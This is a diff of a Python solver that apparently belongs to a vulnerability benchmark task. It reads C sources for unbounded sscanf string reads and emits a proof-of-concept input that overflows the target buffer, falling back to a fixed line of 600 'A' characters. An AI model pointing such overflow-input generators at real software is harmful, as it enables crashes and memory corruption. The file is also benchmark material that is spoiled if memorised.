-        snippet = mod_lines[idx] + "\n"
-    return snippet
+        s = f"{prefix}{hx}\n"
+    return s.encode("ascii", "ignore")
 
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        with tempfile.TemporaryDirectory() as td:
-            root = Path(td)
-            _safe_extract_tar(src_path, td)
+        files = _iter_files(src_path)
+        if not files:
+            return (b"hex=" + (b"A" * 600) + b"\n")
 
-            # If tar extracted with a single top-level folder, set root to it for nicer paths
-            try:
-                entries = [p for p in root.iterdir() if p.name not in (".", "..")]
-                if len(entries) == 1 and entries[0].is_dir():
-                    root = entries[0]
-            except Exception:
-                pass
+        sample = _find_sample_hex_kv(files)
+        candidates = _analyze_sources(files)
 
-            src_exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hpp"}
-            global_macros: Dict[str, int] = {}
-            file_texts: Dict[Path, str] = {}
+        chosen: Optional[_Candidate] = None
 
-            # First pass: read source texts and collect macros
-            for path in _iter_files(root):
-                if not path.is_file():
-                    continue
-                if path.suffix.lower() not in src_exts:
-                    continue
-                txt = _read_text_limited(path, 2_000_000)
-                if txt is None:
-                    continue
-                file_texts[path] = txt
-                ms = _parse_macros(txt)
-                for k, v in ms.items():
-                    if k not in global_macros:
-                        global_macros[k] = v
+        if candidates:
+            # Prefer candidates that match sample key if available
+            if sample:
+                skey, ssep, sprefix = sample
+                matching = [c for c in candidates if c.key and c.key.lower() == skey.lower()]
+                if matching:
+                    matching.sort(key=lambda c: (-c.likelihood, c.est_len))
+                    chosen = matching[0]
+                    chosen = _Candidate(
+                        key=skey,
+                        sep=ssep,
+                        prefix=chosen.prefix or sprefix,
+                        hex_len=chosen.hex_len,
+                        likelihood=chosen.likelihood + 5,
+                        est_len=chosen.est_len,
+                        origin=chosen.origin + ":sample-match",
+                    )
 
-            best = None  # (score, path, fmt, spec_idx, spec_obj, dest_size, key)
-            for path, txt in file_texts.items():
-                macros = dict(global_macros)
-                macros.update(_parse_macros(txt))
-                decls = _parse_char_arrays(txt, macros)
+            if chosen is None:
+                candidates.sort(key=lambda c: (-c.likelihood, c.est_len))
+                chosen = candidates[0]
+                if sample and (not chosen.key):
+                    skey, ssep, sprefix = sample
+                    chosen = _Candidate(
+                        key=skey,
+                        sep=ssep,
+                        prefix=chosen.prefix or sprefix,
+                        hex_len=max(chosen.hex_len, 600),
+                        likelihood=chosen.likelihood,
+                        est_len=0,
+                        origin=chosen.origin + ":sample-key-fallback",
+                    )
 
-                for fn in ("sscanf", "fscanf"):
-                    calls = _find_calls(txt, fn)
-                    for call in calls:
-                        args = _split_args(call)
-                        if len(args) < 3:
-                            continue
-                        fmt_arg = args[1] if len(args) > 1 else ""
-                        fmt = _extract_string_literal(fmt_arg)
-                        if fmt is None or "%".encode() is None:
-                            continue
+        if chosen is None:
+            if sample:
+                skey, ssep, sprefix = sample
+                hex_len = 600
+                if hex_len % 2 == 1:
+                    hex_len += 1
+                return _build_poc_line(skey, ssep, sprefix, hex_len)
+            return (b"hex=" + (b"A" * 600) + b"\n")
 
-                        specs = _parse_scanf_format(fmt)
-                        if not specs:
-                            continue
+        # Clamp to a sensible range and ensure even length if hex-looking
+        hex_len = int(chosen.hex_len)
+        if hex_len < 64:
+            hex_len = 64
+        if hex_len > 4096:
+            hex_len = 4096
+        if (chosen.prefix or "hex" in (chosen.key or "").lower()) and (hex_len % 2 == 1):
+            hex_len += 1
 
-                        # Determine mapping: which spec consumes a destination argument
-                        argpos = 0  # number of args consumed (including 'n')
-                        for si, sp in enumerate(specs):
-                            if not sp.needs_arg:
-                                continue
-                            dest_idx = 2 + argpos
-                            argpos += 1
-                            if dest_idx >= len(args):
-                                continue
-                            if not sp.unbounded_string:
-                                continue
-                            dest_expr = args[dest_idx]
-                            ident = _best_identifier(dest_expr)
-                            if not ident:
-                                continue
-                            dest_size = decls.get(ident)
-                            if not dest_size or dest_size <= 0:
-                                continue
+        # If we have a sample key, prefer it when the chosen key is missing/odd
+        key = chosen.key
+        sep = chosen.sep
+        prefix = chosen.prefix
+        if sample:
+            skey, ssep, sprefix = sample
+            if not key or key.lower() in ("hex", "value", "val") or len(key) > 60:
+                key, sep = skey, ssep
+                if not prefix:
+                    prefix = sprefix
 
-                            key = _extract_key_from_format(fmt, sp)
-                            score = _score_candidate(str(path), fmt, sp, dest_size)
-                            if best is None or score > best[0] or (score == best[0] and dest_size < best[5]):
-                                best = (score, path, fmt, si, sp, dest_size, key)
-
-            if best is None:
-                # fallback: roughly ground-truth length and hex-like config
-                return (b"hex=0x" + (b"A" * 540) + b"\n")
-
-            _, best_path, best_fmt, best_spec_idx, best_spec, best_size, best_key = best
-
-            # Minimal overflow for %s and %[...]: len == size causes size+1 write due to NUL terminator
-            overflow_len = max(1, int(best_size))
-            long_token = "A" * overflow_len
-
-            # Try to leverage a template config for better reach, but keep output short by extracting the relevant section
-            template = _find_best_config_template(root, best_key)
-            if template is not None:
-                cfg_txt = _read_text_limited(template, 200_000)
-                if cfg_txt is not None:
-                    modified_full, ok = _modify_config_text_to_overflow(cfg_txt, best_key, long_token)
-                    if ok:
-                        snippet = _extract_section_snippet(cfg_txt, best_key, modified_full)
-                        if snippet:
-                            return snippet.encode("utf-8", errors="ignore")
-                        return modified_full.encode("utf-8", errors="ignore")
-
-            # Otherwise, generate a single line that matches the scanf format
-            line = _generate_input_from_format(best_fmt, best_spec_idx, long_token)
-            return line.encode("utf-8", errors="ignore")
+        return _build_poc_line(key, sep, prefix, hex_len)
